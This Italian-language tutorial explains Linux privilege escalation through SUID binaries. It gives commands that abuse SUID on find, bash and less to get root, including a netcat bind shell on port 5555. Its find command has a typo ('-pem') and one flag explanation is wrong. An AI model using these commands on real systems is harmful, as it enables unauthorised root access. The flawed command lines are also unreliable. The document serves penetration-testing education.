# Linux Privilege Escalation using SUID Binaries

## Introduzione

SUID (Setu User ID) è una tipologia di permesso che viene affidato ad un file e permette agli utenti di eseguirlo con i permessi dell'utente proprieratio (oltre ai propri).\
Possiamo identificare che un eseguibile è stato settato con il SUID guardando semplicemente i 3 bit dell'utente nei bit
`rwx`.

Digitiamo

`ls -la`

Se è presente una _s_ al posto della _x_, vuol dire che il file ha il bit SUID impostato.


***ATTENZIONE***

***Il seguente articolo è a puro scopo informativo e il suo contenuto non deve essere utilizzato per alcuna attività
illegale.***

***L'autore non è responsabile di alcuna attività malevola causata dalla scorretta interpretazione di questo post.***

## Come trovare i file SUID

Per trovare i file con il SUID basta digitare il seguente comando:

`find / -pem -u=s -type f 2>/dev/null`

Facciamo un po' di chiarezza sulla sintassi del comando:
  * `/` indica che la ricerca partirà dalla cartella root
  * `-perm` indica che vogliamo cercare file con i permessi elencati
  * `-u=s` permette di specificare che la ricerca si vuole effettuare sui file posseduti dal root
  * `-type` permette di indicare la tipologia di file che vogliamo cercare
  * `f` sta ad indicare che vogliamo ricercare file "regolari", quindi non direcotry o file speciali
  * `>` usato per indicare la direzione
  * `/dev/null` è un oggetto filesystem speciale che scarta ogni cosa scritta al suo interno
  
## Funzionamento del SUID

In Linux esistono alcuni comandi utilizzabili da utenti non root per aumentare i propri privilegi.\
Alcuni famosi sono:
  * `bash`
  * `cat`
  * `find`
  * `cp`
  * `echo`
  * `less`
  * `more`
  * `nano`
  * `nmap`
  * `vim`
  
  Per una lista completa basta visitare il seguente link:
  * https://gtfobins.github.io/#+suid
  
  
### Exploit con Find
  
L'utility `find` può essere utilizzata per trovare file nel sistema.\
Ha inoltre l'abilità di eseguire comandi e quindi, se è configurato con i permessi SUID, tutti i comandi eseguiti saranno eseguiti come utente root.

Eseguendo il comando

`find . -exec whoami \;`

Vedremo stampato in console `root`.

È possibile, dato che la maggior parte dei sistemi Linux ha installato `netcat`, elevare la shell in una shell root.\
Per farlo è sufficiente eseguire il comando

`find . -exec netcat -lvp 5555 -e /bin/sh \;`

Connettendoci alla porta 5555 avremo a disposizione una shell root:

`netcat 192.168.1.0 5555`

### Exploit con Bash

Per ottenere una shell root con Bash impostato con il SUID è necessario digitare

`bash -p`

### Exploit con Less

L'utlity Less mostra il contenuto di uno o più file di testo ma può eseguire comandi a shell root.\
Lo stesso principio si applica ad utility come `More`.
I comandi digitati sono 

`less /etc/passwd`

Verrà presentato quindi il contenuto del file.
Basta ora digitare

`!/bin/sh`

per ottenere una shell con permessi root.

## Letture consigliate
Ci tengo a citare alcune pagine da cui ho preso spunto per la scrittura del seguente articolo e altre in cui è possibile approfondire alcuni argomenti citati nel documento.
  * Linux Privilege Escalation by Using SUID: https://medium.com/@gbmbalag/linux-privilege-escalation-by-using-suid-19d37821ed12
  * SUID Executables: https://pentestlab.blog/2017/09/25/suid-executables/
  * Bit rwx: https://it.wikipedia.org/wiki/Permessi_(informatica)
  * SetUID e SetGID: https://it.wikipedia.org/wiki/Setuid_e_setgid
  
